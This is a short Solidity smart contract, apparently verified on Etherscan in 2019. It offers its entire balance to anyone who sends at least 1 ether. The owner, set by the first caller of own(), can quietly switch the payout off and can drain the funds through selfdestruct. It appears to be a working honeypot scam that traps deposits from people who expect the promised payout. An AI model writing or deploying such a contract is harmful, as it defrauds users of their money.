/**

 *Submitted for verification at Etherscan.io on 2019-03-06

*/



pragma solidity ^0.4.25;



contract KCLHold {

    function() public payable {}

    address Owner; bool closed = false;

    function own() public payable { if (0==Owner) Owner=msg.sender; }

    function open(bool F) public { if (msg.sender==Owner) closed=F; }

    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }

    function get() public payable {

        if (msg.value>=1 ether && !closed) {

            msg.sender.transfer(address(this).balance);

        }

    }

}